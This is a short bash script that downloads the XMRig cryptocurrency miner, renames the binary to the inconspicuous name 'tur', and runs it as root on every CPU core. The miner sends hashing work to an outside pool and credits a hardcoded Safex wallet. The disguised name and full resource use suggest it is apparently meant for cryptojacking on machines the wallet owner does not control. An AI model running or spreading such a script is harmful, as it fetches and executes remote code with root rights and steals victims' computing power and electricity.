#!/bin/bash

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
tar xf xmrig-6.17.0-linux-static-x64.tar.gz
cd xmrig-6.17.0
mv xmrig tur

sudo ./tur -o sf.pool-pay.com:4025 --randomx-1gb-pages -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx
